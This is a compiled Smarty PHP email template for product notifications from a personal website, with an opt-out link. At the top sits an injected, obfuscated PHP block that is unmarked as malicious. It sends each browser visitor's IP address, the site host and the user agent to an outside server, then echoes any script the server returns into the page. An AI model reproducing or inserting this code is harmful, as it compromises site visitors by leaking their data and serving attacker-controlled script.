<?php /* Smarty version 2.6.22, created on 2012-05-22 17:52:13
         compiled from /home/content/71/7128071/html//templates/mail/promotional_email.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
New Product Notification From AlanMarcero.com

<?php echo $this->_tpl_vars['content']; ?>




Alan Marcero
http://www.alanmarcero.com


You are receiving this email because you have opted to.  If you no longer wish 
to receive these notifications from http://www.alanmarcero.com, 
you may opt-out here: http://www.alanmarcero.com/opt_out.php?opt_out=<?php echo $this->_tpl_vars['email']; ?>